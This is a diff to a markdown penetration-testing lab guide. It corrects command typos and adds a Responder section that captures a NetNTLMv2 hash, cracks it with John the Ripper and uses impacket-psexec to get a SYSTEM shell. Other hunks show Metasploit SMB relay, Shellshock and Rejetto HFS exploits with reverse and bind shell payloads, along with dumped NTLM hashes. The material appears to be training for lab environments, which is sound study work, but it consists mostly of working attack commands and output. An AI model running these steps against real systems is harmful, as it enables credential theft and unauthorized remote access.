@@ -20,11 +20,10 @@
 	- Windows Exploitation: DNS and SMB Relay Attack (with dnsspoof, arpspoof, Metasploit)
 	- Windows Exploitation: MSSQL DB User Impersonation to RCE (with Nmap, impacket-mssqlclient)
 - Linux Exploitation
-	- Linux Black-Box Penetration Test (with Nmap, Metasploit)
+	- Linux Exploitation: Black-Box Penetration Test (with Nmap, Metasploit)
 - Windows Post-Exploitation
 	- Windows Post-Exploitation: Dumping and Cracking NTLM Hashes (with Nmap, Metasploit, JohntheRipper/Hashcat)
 	- Windows Black-Box Penetration Test (with Nmap, Metasploit, proxychains, xfreerdp)
-- MITM and Network-Based Attacks
 - Antivirus Evasion (with UPX and Veil-Framework)
 
 ### Prerequisites
@@ -4661,7 +4660,7 @@ Nmap done: 1 IP address (1 host up) scanned in 5.29 seconds
 
 **SMB Relay Attack**
 
-An SMB relay attack is a type of network attack where an attacker <u>intercepts SMB (Server Message Block) traffic, manipulates it, and relays it to a legitimate server to gain unauthorized access to resources or perform malicious actions</u>.
+An SMB relay attack is a type of network attack where <u>an attacker intercepts SMB (Server Message Block) traffic, manipulates it, and relays it to a legitimate server to gain unauthorized access to resources or perform malicious actions</u>.
 
 This type of attack is common in Windows networks, where SMB is used for file sharing, printer sharing, and other network services.
 
@@ -4749,7 +4748,7 @@ lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
 
 _Scan the network to identify live hosts in the `172.16.5.0/24` subnet._
 
-`fping -a -g ./24 2> /dev/null`:
+`fping -a -g 172.16.5.0/24 2> /dev/null`:
 ```
 172.16.5.1
 172.16.5.5 ←
@@ -4792,7 +4791,7 @@ Nmap done: 1 IP address (1 host up) scanned in 94.80 seconds
 
 _Prepare the hosts file to spoof DNS requests for the `.sportsfoo.com` domain._
 
-`echo "172.16.5.101 *.sportsfoo.com" > ./hosts`
+`echo '172.16.5.101 *.sportsfoo.com' > ./hosts.txt`
 
 _Use `dnsspoof` to redirect DNS traffic intended for `.sportsfoo.com` to the attacker's machine._
 
@@ -4802,7 +4801,7 @@ Version: 2.4
 Usage: dnsspoof [-i interface] [-f hostsfile] [expression]
 ```
 
-`dnsspoof -i eth1 -f ./hosts`:
+`dnsspoof -i eth1 -f ./hosts.txt`:
 ```
 dnsspoof: listening on eth1 [udp dst port 53 and not src 172.16.5.101]
 ```
@@ -4843,11 +4842,131 @@ Usage: arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host
 
 **Explanation:** _This command tells the client (`172.16.5.5`) that the attacker's machine is the gateway (`172.16.5.1`). Together, these commands allow the attacker to intercept traffic between the client and the gateway._
 
+##### Alternative: Capture and Crack NetNTLMv2 with Responder
+
+The following workflow captures and cracks the authentication instead of relaying it. Run it separately from the Metasploit SMB relay workflow below, because the SMB listeners may otherwise compete for the same port.
+
+`responder -I eth1`:
+```
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.0.6.0
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    DNS/MDNS                   [ON]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON] ←
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Fingerprint hosts          [OFF]
+
+[+] Generic Options:
+    Responder NIC              [eth1]
+    Responder IP               [172.16.5.101]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP']
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-AKK1QXVG95P]
+    Responder Domain Name      [GNC4.LOCAL]
+    Responder DCE-RPC Port     [49344]
+[!] Error starting TCP server on port 3389, check permissions or other servers running.
+
+[+] Listening for events...
+```
+
+_Capture the NetNTLMv2 challenge-response._
+
+```
+[WebDAV] NTLMv2 Client   : 172.16.5.5
+[WebDAV] NTLMv2 Username : domain\aline
+[WebDAV] NTLMv2 Hash     : aline::domain:44cad0a0fc2a78dd:BEEF1D37518D83507346F49811163AEB:010100000000000078766FEA230FD8019E6DAD81ABE14970000000000200080047004E004300340001001E00570049004E002D0041004B004B00310051005800560047003900350050000400140047004E00430034002E004C004F00430041004C0003003400570049004E002D0041004B004B00310051005800560047003900350050002E0047004E00430034002E004C004F00430041004C000500140047004E00430034002E004C004F00430041004C000800300030000000000000000100000000200000CE0E3CF4BB9FA2899D3BD4FD6F1E51406393CB6BE5FD6915D615B63C3BA474200A0010000000000000000000000000000000000009003A0048005400540050002F00660069006C0065007300650072007600650072002E00730070006F0072007400730066006F006F002E0063006F006D000000000000000000 ←
+```
+
+`vim ./ntlm_hash.txt`:
+```
+aline::domain:44cad0a0fc2a78dd:BEEF1D37518D83507346F49811163AEB:010100000000000078766FEA230FD8019E6DAD81ABE14970000000000200080047004E004300340001001E00570049004E002D0041004B004B00310051005800560047003900350050000400140047004E00430034002E004C004F00430041004C0003003400570049004E002D0041004B004B00310051005800560047003900350050002E0047004E00430034002E004C004F00430041004C000500140047004E00430034002E004C004F00430041004C000800300030000000000000000100000000200000CE0E3CF4BB9FA2899D3BD4FD6F1E51406393CB6BE5FD6915D615B63C3BA474200A0010000000000000000000000000000000000009003A0048005400540050002F00660069006C0065007300650072007600650072002E00730070006F0072007400730066006F006F002E0063006F006D000000000000000000
+```
+
+`john --wordlist=/usr/share/wordlists/rockyou.txt ./ntlm_hash.txt`:
+```
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+soccer           (aline) ←
+1g 0:00:00:00 DONE (2022-01-21 19:09) 14.28g/s 29257p/s 29257c/s 29257C/s 123456..lovers1
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed
+```
+
+`john --show --format=netntlmv2 ./ntlm_hash.txt`:
+```
+aline:soccer:domain:44cad0a0fc2a78dd:BEEF1D37518D83507346F49811163AEB:010100000000000078766FEA230FD8019E6DAD81ABE14970000000000200080047004E004300340001001E00570049004E002D0041004B004B00310051005800560047003900350050000400140047004E00430034002E004C004F00430041004C0003003400570049004E002D0041004B004B00310051005800560047003900350050002E0047004E00430034002E004C004F00430041004C000500140047004E00430034002E004C004F00430041004C000800300030000000000000000100000000200000CE0E3CF4BB9FA2899D3BD4FD6F1E51406393CB6BE5FD6915D615B63C3BA474200A0010000000000000000000000000000000000009003A0048005400540050002F00660069006C0065007300650072007600650072002E00730070006F0072007400730066006F006F002E0063006F006D000000000000000000
+
+1 password hash cracked, 0 left
+```
+
+`impacket-psexec aline@172.16.5.10`:
+```
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+Password: ←
+[*] Requesting shares on 172.16.5.10.....
+[*] Found writable share ADMIN$
+[*] Uploading file vzMvCLif.exe
+[*] Opening SVCManager on 172.16.5.10.....
+[*] Creating service WAxZ on 172.16.5.10.....
+[*] Starting service WAxZ.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+```
+
 _Launch Metasploit and configure the SMB Relay attack._
 
 `msfconsole -q`
 
-`search smb_relay`, `use exploit/windows/smb/smb_relay`, `set PAYLAD windows/meterpreter/reverse_tcp`, `show options`, `set SMBHOST 172.16.5.10`, `set SRVHOST 172.16.5.101`,  `set LHOST 172.16.5.101`, `set LPORT 4444`, `exploit`:
+`search smb_relay`, `use exploit/windows/smb/smb_relay`, `set PAYLOAD windows/meterpreter/reverse_tcp`, `show options`, `set SMBHOST 172.16.5.10`, `set SRVHOST 172.16.5.101`,  `set LHOST 172.16.5.101`, `set LPORT 4444`, `exploit`:
 ```
 [*] Exploit running as background job 0.
 [*] Exploit completed, but no session was created.
@@ -5671,7 +5790,7 @@ Content-Type: text/html
 X-Pad: avoid browser bug
 ```
 
-`search apache_mod_cgi`, `use exploit/multi/http/apache_mod_cgi_bash_env_exec`, `set PAYLOAD linux/x86/meterpreter/bind_tcp`, `show options`, `set RHOSTS 192.220.123.3`, `set RHOST 192.220.123.3`, `set TARGETURI /cgi-bin/stats`, `set LPORT 6666`, `exploit`:
+`search apache_mod_cgi`, `use exploit/multi/http/apache_mod_cgi_bash_env_exec`, `set PAYLOAD linux/x86/meterpreter/bind_tcp`, `show options`, `set RHOSTS 192.220.123.3`, `set RPORT 80`, `set TARGETURI /cgi-bin/stats`, `set LPORT 6666`, `exploit`:
 ```
 [*] Command Stager progress - 100.48% done (1037/1032 bytes)
 [*] Started bind TCP handler against 192.220.123.3:6666 ←
@@ -5948,6 +6067,8 @@ bob:1009:aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a924a03510ef::: �
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 ```
 
+`background`
+
 `creds`:
 ```
 Credentials
@@ -5958,8 +6079,6 @@ host         origin       service        public         private                 
 10.4.20.107  10.4.20.107  445/tcp (smb)  Administrator  aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c         NTLM hash     nt,lm ←
 10.4.20.107  10.4.20.107  445/tcp (smb)  bob            aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a924a03510ef         NTLM hash     nt,lm ←
 ```
-
-`background`
 
 <span style="color: #e57373;">**Attacker machine**</span>.
 
@@ -6521,7 +6640,7 @@ Stopped: Fri Aug 30 15:50:08 2024
 
 `msfconsole -q`
 
-`search crack_windows`, `use auxiliary/analyze/crack_windows`, `show options`, `set CUSTOM_WORDLIST /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`, `set USE-CREDS true`, `run`:
+`search crack_windows`, `use auxiliary/analyze/crack_windows`, `show options`, `set CUSTOM_WORDLIST /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`, `set USE_CREDS true`, `run`:
 ```
 [*] No lm found to crack
 [*] No mscash found to crack
@@ -6734,7 +6853,7 @@ Papers: No Results
 
 `msfconsole -q`
 
-`search hfs`, `use exploit/windows/http/rejetto_hfs_exec`, `set PAYLOAD windows/meterpreter/reverse_tcp`, `show options`, `set RHOSTS demo.ine.local`, `set LHOST 10.10.42.3`, `set LPORT 4444`, `exploit`:
+`search hfs`, `use exploit/windows/http/rejetto_hfs_exec`, `set PAYLOAD windows/meterpreter/reverse_tcp`, `show options`, `set RHOSTS demo.ine.local`, `set TARGETURI /`, `set LHOST 10.10.42.3`, `set LPORT 4444`, `exploit`:
 ```
 [*] Started reverse TCP handler on 10.10.42.3:4444 ←
 [*] Using URL: http://0.0.0.0:8080/5QeAYJieM
